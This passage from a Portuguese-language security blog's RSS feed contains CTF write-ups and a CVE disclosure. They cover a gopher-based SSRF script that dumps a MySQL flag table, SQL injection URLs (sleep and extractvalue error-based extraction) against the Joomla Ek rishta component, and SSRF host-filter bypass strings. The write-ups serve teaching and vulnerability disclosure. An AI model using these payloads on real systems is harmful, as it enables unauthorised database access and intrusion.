+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;curl gopher://127.0.0.1:3306/_%&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/Gie5b2C.png&quot;&gt;
+&lt;img src=&quot;https://i.imgur.com/mJxrJjh.png&quot;&gt;
+&lt;p&gt;Parece que funcionou, bem, mas como já haviamos visto antes, é criado um banco de dados com uma tabela flag com uma coluna secret, então, vamos dumpar ela com o gopher…&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;Vamos mudar o nosso comando de login agora, para mysql -h 127.0.0.1 -u ssrf_user -e “use ssrf; select secret from flag&quot;&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/CTDdkpI.png&quot;&gt;
+&lt;p&gt;Olhando neste novo pacote, a gente consegue até ver a query que será executada…&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;depois de refazer o processo inteiro em cima deste novo pacote, conseguimos enfim a flag!&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/lxvxX7Y.png&quot;&gt;
+&lt;img src=&quot;https://i.imgur.com/jA991Ma.png&quot;&gt;
+</description>
+        <pubDate>Sat, 28 Jul 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/isitdtu-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/isitdtu-writeup/</guid>
+        
+        
+        <category>writeup</category>
+     
+        
+      </item>
+    
+      <item>
+        <title>CVE-2018-12254 - Sql Injection Joomla Ek rishta Component</title>
+        <description>&lt;p&gt;	A vulnerabilidade foi encontrada de uma forma um pouco inusitada. A alguns dias o Daybson estava subindo um laboratório de teste novo, para  o curso de Pentest Profissional da Desec Security, quando me chamou para testa-lo, eu em particular não sabia que vulnerabilidade havia no laboratório, apenas loguei e fui testar. Notei que eu tinha o nome do usuário na seguinte url(&lt;code&gt;index.php/home/requested_user/Sent%20interest/corp&lt;/code&gt;) e me pareceu um pouco estranho, talvez fosse gerado um novo arquivo durante o registro ou algo assim, mas na verdade notei que aquilo não era um arquivo, era realmente um parâmetro da url.&lt;/p&gt;
+&lt;br&gt;
+	&lt;p&gt;O teste inicial logicamente foi adicionar uma aspas simples e ver o que iria me retornar:&lt;/p&gt;
+&lt;br&gt;
+&lt;code&gt;url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1&apos;or%20a%23&lt;/code&gt;
+&lt;center&gt;
+&lt;img src=&quot;https://i.imgur.com/AYHQAWL.png&quot;&gt;
+&lt;/center&gt;
+&lt;br&gt;
+	&lt;p&gt;Então, seguindo o erro, temos um Sql Injection aqui!&lt;/p&gt;
+&lt;br&gt;
+	&lt;p&gt;Fazendo mais um teste para confirmar, conseguimos ter a certeza disso:&lt;/p&gt;
+&lt;br&gt;
+&lt;code&gt;url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1&apos;or%20sleep(5)%23&lt;/code&gt;
+&lt;center&gt;
+&lt;img src=&quot;https://i.imgur.com/4LUyOHe.png&quot;&gt;
+&lt;/center&gt;
+&lt;br&gt;
+	&lt;p&gt;Até este ponto estava tudo bem, porém notei uma limitação ao tentar dumpar a db no modo clássico, até mesmo usando blind. Me pareceu estranho não conseguir resposta para algumas querys, porém, entendi que eu estava limitado, fazendo algumas pesquisas vi que a maneira seria fazer o dump usando error based com XPATH Injection.&lt;/p&gt;
+&lt;br&gt;
+&lt;code&gt;url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1&apos;%20or%20extractvalue(1,user())%20%23&lt;/code&gt;
+&lt;center&gt;
+&lt;img src=&quot;https://i.imgur.com/xZwEZAI.png&quot;&gt;
+&lt;/center&gt;
+&lt;br&gt;
+&lt;code&gt;url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1&apos;%20or%20extractvalue(1,version())%20%23&lt;/code&gt;
+&lt;center&gt;
+&lt;img src=&quot;https://i.imgur.com/M7LCI6d.png&quot;&gt;
+&lt;/center&gt;
+&lt;br&gt;
+&lt;code&gt;url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1&apos;%20or%20extractvalue(0x0a,concat(0x0a,(select%20database())))%20%23&lt;/code&gt;
+&lt;center&gt;
+&lt;img src=&quot;https://i.imgur.com/8mRdLKG.png&quot;&gt;
+&lt;/center&gt;
+&lt;br&gt;
+&lt;code&gt;url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1&apos;%20or%20extractvalue(0x0a,concat(0x0a,(select%20table_name%20from%20information_schema.tables)))%20%23&lt;/code&gt;
+&lt;center&gt;
+&lt;img src=&quot;https://i.imgur.com/QU7faTN.png&quot;&gt;
+&lt;/center&gt;
+&lt;br&gt;
+	&lt;p&gt;Bom, a partir deste ponto, a melhor forma seria criar um script para fazer o dump!&lt;/p&gt;
+&lt;br&gt;
+	&lt;p&gt;Depois disso, eu ainda assim fiquei curioso para saber como que o componente estava capturando esta parte da url, então baixei o código dele e vasculhei até encontrar o seguinte trecho:&lt;/p&gt;
+&lt;br&gt;
+&lt;code&gt;router.php&lt;/code&gt;
+&lt;br&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;mi&quot;&gt;238&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$segments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$segments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;requested_user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;239&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; 	&lt;span class=&quot;nv&quot;&gt;$c_id&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;EkrishtaUsrID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$segments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;240&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$segments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Sent interest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;241&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;	  &lt;span class=&quot;nv&quot;&gt;$vars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;rid&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$c_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;242&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;243&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;	  &lt;span class=&quot;nv&quot;&gt;$vars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cid&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$c_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;244&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+	&lt;p&gt;Fazendo uma analise rápida, sabemos que o &lt;code&gt;$c_id&lt;/code&gt; esta capturando o segmento que está o nosso nome de usuário e adicionando ele a um array (&lt;code&gt;$vars&lt;/code&gt;), podemos basicamente adivinhar que a função &lt;code&gt;EkrishtaUsrID()&lt;/code&gt; está buscando o nosso id ou o nome do usuário no banco de dados, mas vamos ver o que realmente ela está fazendo.&lt;/p&gt;
+&lt;br&gt;
+&lt;br&gt;
+	&lt;p&gt;Fazendo uma procura pela função &lt;code&gt;EkrishtaUsrID()&lt;/code&gt;, encontrei ela presente no mesmo arquivo e é possível ver que que existe uma falta de sanitização nas linhas &lt;code&gt;295&lt;/code&gt; e &lt;code&gt;305&lt;/code&gt;.&lt;/p&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;mi&quot;&gt;291&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EkrishtaUsrName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;292&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;293&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;294&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;	 &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getDBO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;295&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;	 &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT `username` FROM #__users WHERE `id`=&apos;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$uid&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;296&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;	 &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;setQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;297&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; 	 &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;loadResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;298&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;299&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;301&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EkrishtaUsrID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uid_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;302&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;303&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;304&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; 	 &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getDBO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;305&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;	 &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT `id` FROM #__users WHERE `username`= &apos;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uid_name&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;306&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;	 &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;setQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;307&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;	 &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;loadResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;308&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;309&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+	&lt;p&gt;Para finalizar a história, a vulnerabilidade que eu encontrei não estava dentro daquilo que estava programado para o laboratório e também não estava assinada ou relacionada a qualquer outra descoberta, então peguei uma cve :).&lt;/p&gt;
+</description>
+        <pubDate>Mon, 11 Jun 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/sql-injection-joomla-component/</link>
+        <guid isPermaLink="true">http://localhost:4000/sql-injection-joomla-component/</guid>
+        
+        
+        <category>vulnerabilities</category>
+     
+        
+      </item>
+    
+      <item>
+        <title>NoNameConCTF - Convert Writeup</title>
+        <description>&lt;pre&gt;
+  Convert 100
+
+  If you need to convert something to Markdown, you can try our service: http://convert.nonameconctf2018.xyz
+&lt;/pre&gt;
+
+&lt;p&gt;Este desafio ilustra um simples SSRF!&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;Uma das primeiras coisas que tentei foi enviar &lt;code&gt;http://127.0.0.1&lt;/code&gt;, mas sem sucesso.&lt;/p&gt;
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/839eg3Y.png&quot;&gt;
+&lt;br&gt;
+&lt;p&gt;Então eu decidi tentar com &lt;code&gt;0.0.0.0&lt;/code&gt;.&lt;/p&gt;
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/kc81Z6l.png&quot;&gt;
+&lt;br&gt;
+&lt;p&gt;E funcionou, porém eu não sabia o que procurar, então, fiz o simples, usei o dirb para procurar algum arquivo no webroot:&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/uCThGlR.jpg&quot;&gt;
+&lt;br&gt;
+&lt;p&gt;Temos um arquivo que nao temos permissão para acesso, porém, como temos o ssrf, podemos bypassar isso...&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/CtqseLe.png&quot;&gt;
+</description>
+        <pubDate>Tue, 24 Apr 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/nonameconctf-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/nonameconctf-writeup/</guid>
+        
+        
+        <category>writeups</category>
+     
+        
+      </item>
+    
+      <item>
+        <title>SunshineCtf - Search Box Writeup</title>
+        <description>&lt;code&gt;&quot;This search engine doesn&apos;t look very secure.
+Or well coded.
+Or competent in any way shape or form.
+This should be easy.
+&lt;br&gt;
+&lt;br&gt;
+Note: flag is in /etc/flag.txt
+&lt;br&gt;
+&lt;br&gt;
+http://search-box.web1.sunshinectf.org&quot;&lt;/code&gt;
+&lt;br&gt;
+&lt;br&gt;
+Dentro da página tinhas um pequeno input para enviarmos uma request para um site que seria algum &quot;qualquer&quot;.
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/vltSBlC.png&quot;&gt;
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/wpr4QMb.png&quot;&gt;
+&lt;br&gt;
+&lt;br&gt;
+Porém, com alguns pequenos testes acabei percebendo que ele estava apenas aceitando o &lt;code&gt;host&lt;/code&gt; como sendo &apos;www.google.com&apos;.
+Lógicamente uma das primeiras coisas que me veio na cabeça seria tentar acessar algum arquivo via &lt;code&gt;file://&lt;/code&gt;, porem, sem sucesso.
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/ImCQbcQ.png&quot;&gt;
+&lt;br&gt;
+&lt;br&gt;
+no momento que eu comecei a pensar que o &lt;code&gt;file://&lt;/code&gt; não teria serventia, pensei em fazer o seguinte, juntar o wrapper mais o domínio que havia funcionado:
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/gpuZAAn.png&quot;&gt;
+&lt;br&gt;
+&lt;code&gt;&quot;get source failed&quot;&lt;/code&gt;, oops, então quer dizer que o wrapper na verdade funciona, o que não está dando certo é a procura pelo www.google.com nos diretorios, ou seja, aqui temos um filtro de host, e para confirmar isso:
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/MnYZ7CY.png&quot;&gt;
+&lt;br&gt;
+&lt;br&gt;
+Está sendo usado o &lt;code&gt;parse_url()&lt;/code&gt; do php, se fizermos alguns pequenos testes, podemos tirar nossas conclusões:
+&lt;br&gt;
+&lt;br&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;php &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;file://www.google.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+php &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; var_dump&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;parse_url&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+array&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;scheme&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&amp;gt;&lt;/span&gt;
+  string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;host&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&amp;gt;&lt;/span&gt;
+  string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;www.google.com&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;br&gt;
+Levando em consideração que o nosso host precisa ser sempre www.google.com, precisamos achar uma forma de conseguir passar uma chamada para algum arquivo interno, ou primeiro, tentar conseguir acessar o localhost.
+&lt;br&gt;
+&lt;br&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;php &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://127.0.0.1@www.google.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+php &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; var_dump&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;parse_url&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+array&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;scheme&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&amp;gt;&lt;/span&gt;
+  string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http&quot;&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;host&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&amp;gt;&lt;/span&gt;
+  string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;www.google.com&quot;&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&amp;gt;&lt;/span&gt;
